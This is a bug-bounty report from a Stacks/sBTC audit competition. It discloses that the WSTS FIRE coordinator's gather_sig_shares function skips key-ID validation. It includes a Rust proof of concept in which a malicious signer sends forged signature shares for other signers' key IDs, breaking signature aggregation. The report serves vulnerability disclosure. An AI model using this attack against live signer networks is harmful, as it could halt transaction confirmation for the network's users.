# #41202 \[BC-Insight] A malicious signer can force a failure of the signature round by providing a key ID they don't own

**Submitted on Mar 12th 2025 at 11:36:50 UTC by @christ0s for** [**Attackathon | Stacks II**](https://immunefi.com/audit-competition/stacks-attackathon-2)

* **Report ID:** #41202
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/stacks-network/sbtc/blob/immunefi\\_attackaton\\_1.0/Cargo.toml#L31>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

A malicious signer can disrupt transaction signing by submitting signature shares claiming key IDs they don't actually own. The `FIRE` coordinator in the `WSTS` library lacks `key ID` validation in the `gather_sig_shares` function, accepting signature shares for ANY KEY ID without verification, while properly validating key IDs during nonce collection.

This inconsistency allows an attacker to submit signature shares for keys belonging to other signers, causing signature aggregation to fail with crypttographical errors and preventing the creation of valid Bitcoin transactions.

## Vulnerability Details

The root cause is an inconsistency in validation between two functions in the FIRE coordinator's implementation:

1. The `gather_nonces` function properly validates key IDs:

```rust
for key_id in &nonce_response.key_ids {
    if let Some(key_ids) = self.config.signer_key_ids.get(&nonce_response.signer_id) {
        if key_ids.contains(key_id) {
            nonce_info.nonce_recv_key_ids.insert(*key_id);
        } else {
            warn!("Key id {} not in signer key ids {:?}", key_id, key_ids);
        }
    }
}
```

2. However, the `gather_sig_shares` function has no equivalent validation

This validation gap allows a malicious signer to:

* Claim ownership of key IDs belonging to other signers
* Submit signature shares with incorrect cryptographic material for those keys
* Cause signature aggregation to fail when the coordinator attempts to combine the signatures

## Proof of Concept

Add the following code to `transaction_signer.rs` to demonstrate the attack:

```rust
 should_pop_state_machine = false;
                        state_machine_id
                    }
                };

                // first send the normal message
                // Process the message in the signer state machine.
                let response = self
                    .relay_message(
                        &state_machine_id,
                        msg.id,
                        msg_public_key,
                        None,
                        &msg.inner,
                        &chain_tip.block_hash,
                    )
                    .await;

                // Modified attack logic to test key ID validation
                static mut REQUEST_COUNTER: u32 = 0;
                let should_attack_request = unsafe {
                    REQUEST_COUNTER += 1;
                    // Attack more frequently (every other request) to ensure we hit the test case
                    if REQUEST_COUNTER % 2 == 0 {
                        println!("\n!!! =============================================");
                        println!("!!! KEY ID VALIDATION ATTACK TRIGGERED (Attack #{}) !!!", REQUEST_COUNTER / 2);
                        println!("!!! =============================================\n");
                        true
                    } else {
                        false
                    }
                };

                // Attack every other request to demonstrate the vulnerability
                if should_attack_request {
                    // Wait for our legitimate response to be processed first
                    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

                    // Get our signer ID - for a real PoC we could determine this dynamically
                    let our_signer_id = 1; // Using a simple ID for the demo
                    
                    // Use a wider range of key IDs to increase chances of hitting the vulnerability
                    // Including key ID 0 which is commonly used in tests
                    let stolen_key_ids = vec![0, 1, 2, 3, 4, 5, 6, 7, 8, 9];

                    use p256k1::scalar::Scalar;
                    use wsts::common::SignatureShare;
                    use wsts::net::Message as WstsNetMessage;
                    use wsts::net::SignatureShareResponse;

                    println!("\n!!! KEY ID VALIDATION VULNERABILITY !!!");
                    println!("!!! Signer {} attempting to steal key IDs: {:?} !!!", our_signer_id, stolen_key_ids);
                    println!("!!! VULNERABILITY: gather_sig_shares() has no key ID validation !!!\n");

                    // Use a very distinctive value that will be easily spotted in logs
                    let z_i = Scalar::from(0xBAAAAAAD_u32);

                    // Create a malicious signature share claiming key IDs from another signer
                    let malicious_share = SignatureShare {
                        id: our_signer_id,
                        z_i,
                        key_ids: stolen_key_ids.clone(),
                    };

                    // Create a new signature share response
                    let malicious_response = SignatureShareResponse {
                        dkg_id: request.dkg_id,
                        sign_id: request.sign_id,
                        sign_iter_id: request.sign_iter_id,
                        signer_id: our_signer_id,
                        signature_shares: vec![malicious_share],
                    };

                    println!("!!! Sending malicious signature share with z_i=0xBAAAAAAD !!!");
                    println!("!!! If this attack succeeds, the aggregate signature will fail !!!");

                    // Send the malicious message to replace our legitimate signature
                    let attack_msg = message::WstsMessage {
                        id: msg.id,
                        inner: WstsNetMessage::SignatureShareResponse(malicious_response),
                    };

                    let response2 = self.send_message(attack_msg, &chain_tip.block_hash).await;
                    
                    println!("\n!!! Malicious message sent: {:?}", response2);
                    println!("!!! This would be rejected if gather_sig_shares() validated key IDs !!!");
                    println!("!!! ============================================= !!!\n");
                }

                // If the state machine is not a DKG verification state machine,
                // then we should pop it from the cache already here since we
                // are not interested in `SignatureShareResponse` messages.
                // TODO: We keep DKG verification-related state machines around
                // so that `verify_sender()` works. This is a bit of a hack.
                if should_pop_state_machine {
                    self.wsts_state_machines.pop(&state_machine_id);
                }

                response?;
            }

            // === NONCE RESPONSE ===
            WstsNetMessage::NonceResponse(request) => {
```

and run the test: `RUST_BACKTRACE=FULL cargo test --package signer --test integration -- transaction_coordinator::sign_bitcoin_transaction_multiple_locking_keys --exact --show-output --nocapture`
